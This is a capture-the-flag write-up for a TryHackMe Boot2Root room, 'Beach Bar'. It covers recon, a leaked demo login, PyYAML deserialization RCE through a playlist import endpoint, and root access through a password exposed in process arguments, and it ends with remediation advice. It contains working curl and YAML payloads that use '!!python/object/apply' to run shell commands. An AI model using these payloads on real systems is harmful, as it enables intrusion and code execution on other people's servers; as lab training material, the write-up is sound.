# Hacker Holidays: Day 5 - Beach Bar

> 📝 **Write-up credit:** Based on the English write-up by [`shelvy1337` (Cybersecurity-Writeups)](https://github.com/shelvy1337/Cybersecurity-Writeups/tree/main/TryHackMe/Hacker%20Holidays%202026) and used with attribution per that repository's terms. Flag values are censored as `THM{REDACTED}` per this repository's convention.

---

> Beach Bar is a classic Boot2Root challenge: initial access through a web application, RCE through unsafe YAML parsing, and privilege escalation through a credential leaked in the arguments of a root-owned process.

## Quick Overview

| Field | Value |
| --- | --- |
| Platform | TryHackMe |
| Event | Hacker Holidays 2026 |
| Day | 5 |
| Category | Boot2Root |
| Difficulty | Easy |
| Techniques | Web, PyYAML Deserialization, RCE, Linux PrivEsc, Credential Reuse |
| Target | `http://MACHINE_IP` |

## Objective

The goal was to capture two flags:

- user flag
- root flag

The room description hinted at a jukebox that accepted more than just song titles. That pointed toward the playlist import feature and unsafe YAML parsing.

## Attack Path

1. I performed port reconnaissance.
2. I found a Flask/Gunicorn web app on port `80`.
3. I found demo credentials `dj:dj` in an HTML comment on the login page.
4. After logging in, I inspected `/dashboard`, `/import`, and `/export`.
5. I exploited unsafe YAML deserialization in the playlist import feature.
6. I obtained RCE as the `bartender` user.
7. I read the user flag.
8. I found a root-owned `jukeboxd` process leaking a password in its arguments.
9. The same password worked for `su root`.
10. I read the root flag.

## Recon

The port scan showed only SSH and HTTP:

```bash
nmap -sV -sC -T4 -oN nmap.txt MACHINE_IP
```

Important results:

```text
22/tcp open  ssh
80/tcp open  http    gunicorn
```

The root page redirected to `/login`, and `gobuster` found a few useful paths:

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Result:

```text
/dashboard
/export
/import
/login
/logout
```

Most endpoints required a session, so the next step was to inspect the login page.

## Login

The `/login` HTML contained a staff comment:

```html
<!--
  staff note: the demo DJ login is still enabled for the soft opening.
  dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```

Use the demo credentials:

```bash
curl -s -i -c cookies.txt -b cookies.txt \
  -X POST http://MACHINE_IP/login \
  -d 'username=dj&password=dj'
```

After authentication, `/dashboard`, `/import`, and `/export` became available.

## Playlist Import

The `/export` endpoint returned a sample YAML playlist. The next logical target was `/import`, which accepted a playlist and rendered the parsed structure back in the response.

Example benign YAML:

```yaml
playlist:
  name: test
  tracks:
    - artist: A
      title: B
```

The app reflected the server-side parsed structure, suggesting that YAML was being deserialized and rendered back to the page.

After obtaining RCE, the source confirmed the vulnerable sink:

```python
parsed = yaml.load(content, Loader=yaml.Loader)
```

This is unsafe for user-controlled input.

## RCE With PyYAML

PyYAML with `yaml.Loader` supports Python tags such as `!!python/object/apply`. That allows code execution while parsing YAML.

Minimal test:

```bash
curl -s -b cookies.txt -X POST http://MACHINE_IP/import \
  --data-urlencode 'playlist=!!python/object/apply:subprocess.check_output [["id"]]'
```

The response confirmed command execution as `bartender`:

```text
uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
```

For longer commands, Base64 helps avoid quoting issues:

```yaml
!!python/object/apply:subprocess.check_output [["bash","-c","echo <base64_command> | base64 -d | bash"]]
```

## User Flag

With RCE, the user flag can be read directly:

```bash
cat /home/bartender/user.txt
```

**Flag:** `THM{REDACTED}`

## Privilege Escalation

During process enumeration, a root-owned `jukeboxd` process stood out:

```bash
ps auxf
```

Key line:

```text
root ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

The `jukeboxd.py` script required a `--stream-pass` argument, but did not meaningfully use it:

```python
parser.add_argument("--stream-pass", required=True, help="stream backend password")
```

The secret was passed as a process argument, and process arguments are visible to local users through `ps` and `/proc`.

The password:

```text
SunsetSpritz2024!
```

was also reused as the `root` password.

Validation:

```bash
su - root
```

After entering the password, we get root:

```text
uid=0(root) gid=0(root) groups=0(root)
```

## Root Flag

As root, read:

```bash
cat /root/root.txt
```

**Flag:** `THM{REDACTED}`

## Why It Works

The first issue is unsafe YAML deserialization. The application accepted a playlist from the user and parsed it with `yaml.load(..., Loader=yaml.Loader)`, allowing Python objects and function calls to be constructed during parsing. In practice, that gave RCE as the application user.

The second issue is credential disclosure. The `--stream-pass` value was visible in the command line of a root-owned process. That secret was also reused as the root password, so a simple process argument leak became full system compromise.

## How To Fix It

- Do not use `yaml.load()` on user-controlled input.
- Replace it with `yaml.safe_load()` or a schema-validated format.
- Remove demo accounts such as `dj:dj` from production.
- Do not hard-code a static Flask `secret_key`.
- Do not pass secrets as process arguments.
- Do not reuse the same password across different contexts.
- Run services with least privilege instead of root.

## Summary

Day 5 of Hacker Holidays 2026 combines a web vulnerability with a classic Linux privilege escalation. First, we log in with demo credentials, exploit the unsafe PyYAML loader in the playlist import feature, gain RCE as `bartender`, and then find the root password leaked in the arguments of the `jukeboxd` process.

The core idea: `dj:dj`, `/import`, `yaml.load`, RCE as `bartender`, `ps auxf`, `SunsetSpritz2024!`, `su root`.
